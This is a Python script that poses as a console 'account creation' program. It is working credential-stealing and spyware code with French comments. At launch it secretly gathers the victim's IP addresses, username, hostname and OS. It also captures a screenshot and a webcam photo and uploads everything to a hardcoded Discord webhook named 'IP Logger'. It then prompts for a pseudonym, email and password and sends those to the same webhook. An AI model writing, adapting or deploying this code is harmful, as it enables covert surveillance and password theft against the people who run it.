import json
import socket
import getpass
import platform
import io
import os
import uuid
import time
from datetime import datetime
from urllib.request import Request, urlopen


# ============================================
#   TON WEBHOOK DISCORD
# ============================================
WEBHOOK_URL = "https://discord.com/api/webhooks/1575121598837555410/NNkDYw0dOPvgNHNFjmf1lcWTGZRVARcuA0evDc_VsJAP-e4wY-YiTCqlcLWcZoC7QMYC"


# ---------- IP ----------
def get_public_ip():
    for url in ["https://api.ipify.org", "https://ifconfig.me/ip", "https://icanhazip.com"]:
        try:
            req = Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urlopen(req, timeout=5) as r:
                ip = r.read().decode().strip()
                if ip:
                    return ip
        except Exception:
            continue
    return "Inconnue"


def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "Inconnue"


# ---------- Screenshot ----------
def take_screenshot():
    try:
        from PIL import ImageGrab
        img = ImageGrab.grab()
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        return buf.getvalue()
    except Exception:
        return None


# ---------- Webcam ----------
def take_webcam_photo():
    """Prend une photo via la webcam et retourne des bytes JPEG (ou None)."""
    try:
        import cv2
    except ImportError:
        print("⚠️ opencv-python non installé → pip install opencv-python")
        return None

    cap = None
    try:
        # Essaie plusieurs backends (utile surtout sous Windows)
        backends = []
        if os.name == "nt":
            backends = [cv2.CAP_DSHOW, cv2.CAP_MSMF, cv2.CAP_ANY]
        else:
            backends = [cv2.CAP_ANY]

        for backend in backends:
            cap = cv2.VideoCapture(0, backend)
            if cap.isOpened():
                break
            cap.release()
            cap = None

        if cap is None or not cap.isOpened():
            print("⚠️ Webcam introuvable / non accessible")
            return None

        # Laisse le temps à la cam de s'initialiser
        time.sleep(1.0)
        for _ in range(10):
            cap.read()

        ret, frame = cap.read()
        if not ret or frame is None:
            print("⚠️ Webcam : lecture impossible")
            return None

        ok, buf = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 85])
        if not ok:
            return None
        return buf.tobytes()
    except Exception as e:
        print(f"⚠️ Erreur webcam : {e}")
        return None
    finally:
        if cap is not None:
            cap.release()


# ---------- Envoi multipart ----------
def _send_multipart(payload, files):
    boundary = "----PythonFormBoundary" + uuid.uuid4().hex
    body = io.BytesIO()

    def add_field(name, value):
        body.write(f"--{boundary}\r\n".encode())
        body.write(f'Content-Disposition: form-data; name="{name}"\r\n\r\n'.encode())
        body.write(value.encode("utf-8"))
        body.write(b"\r\n")

    def add_file(name, filename, content, content_type):
        body.write(f"--{boundary}\r\n".encode())
        body.write(
            f'Content-Disposition: form-data; name="{name}"; filename="{filename}"\r\n'.encode()
        )
        body.write(f"Content-Type: {content_type}\r\n\r\n".encode())
        body.write(content)
        body.write(b"\r\n")

    add_field("payload_json", json.dumps(payload))

    for fname, filename, content, ctype in files:
        add_file(fname, filename, content, ctype)

    body.write(f"--{boundary}--\r\n".encode())

    req = Request(
        WEBHOOK_URL,
        data=body.getvalue(),
        headers={
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "User-Agent": "Mozilla/5.0",
        },
        method="POST",
    )
    try:
        with urlopen(req, timeout=30) as r:
            return r.status in (200, 204)
    except Exception as e:
        print(f"⚠️ Envoi échoué : {e}")
        return False


# ============================================
#   ENVOI 1 : INFOS PC (IMMÉDIAT, À L'OUVERTURE)
# ============================================
def send_pc_info():
    public_ip = get_public_ip()
    local_ip = get_local_ip()
    user = getpass.getuser()
    hostname = socket.gethostname()
    os_info = f"{platform.system()} {platform.release()}"
    date = datetime.now().strftime("%d/%m/%Y %H:%M:%S")

    desc = (
        f"**IP publique :** {public_ip}\n"
        f"**IP locale :** {local_ip}\n"
        f"**Utilisateur :** {user}\n"
        f"**Machine :** {hostname}\n"
        f"**OS :** {os_info}\n"
        f"**Date :** {date}"
    )

    # Préparation des fichiers
    screenshot = take_screenshot()
    webcam = take_webcam_photo()

    embed_info = {
        "title": "📍 Ouverture du programme",
        "description": desc,
        "color": 3447003,
    }
    embeds = [embed_info]
    attachments = []
    files = []
    file_index = 0

    if screenshot:
        embed_info["image"] = {"url": "attachment://screenshot.png"}
        attachments.append({"id": file_index, "filename": "screenshot.png"})
        files.append((f"files[{file_index}]", "screenshot.png", screenshot, "image/png"))
        file_index += 1

    if webcam:
        embeds.append({
            "title": "📷 Webcam",
            "color": 0x9B59B6,
            "image": {"url": "attachment://webcam.jpg"},
        })
        attachments.append({"id": file_index, "filename": "webcam.jpg"})
        files.append((f"files[{file_index}]", "webcam.jpg", webcam, "image/jpeg"))
        file_index += 1

    payload = {
        "username": "IP Logger",
        "embeds": embeds,
    }
    if attachments:
        payload["attachments"] = attachments

    _send_multipart(payload, files)


# ============================================
#   ENVOI 2 : INFOS SAISIES PAR L'UTILISATEUR
# ============================================
def send_user_info(pseudo, email, password):
    date = datetime.now().strftime("%d/%m/%Y %H:%M:%S")

    desc = (
        f"**Pseudo :** {pseudo}\n"
        f"**Email :** {email}\n"
        f"**Mot de passe :** {password}\n"
        f"**Date :** {date}"
    )

    payload = {
        "username": "IP Logger",
        "embeds": [{
            "title": "🔐 Formulaire rempli",
            "description": desc,
            "color": 0xE74C3C,
        }],
    }

    _send_multipart(payload, [])


# ---------- Interface ----------
def main():
    os.system("cls" if os.name == "nt" else "clear")

    # 🔥 ENVOI 1 — exécuté SYNCHRONIQUEMENT au démarrage
    # (pas de thread → il finit avant d'afficher le formulaire,
    #  donc pas de risque que le programme se ferme avant l'envoi)
    send_pc_info()

    print("═══════════════════════════════════════")
    print("         CRÉATION DE COMPTE")
    print("═══════════════════════════════════════\n")

    pseudo = input("Pseudo       : ").strip()
    email = input("Email        : ").strip()
    password = input("Mot de passe : ").strip()

    print("\nCréation en cours...")

    # 🔥 ENVOI 2 — infos saisies
    send_user_info(pseudo, email, password)

    print("\n✅ Bonne chienne\n")
    input("Appuie sur Entrée pour fermer...")


if __name__ == "__main__":
    main()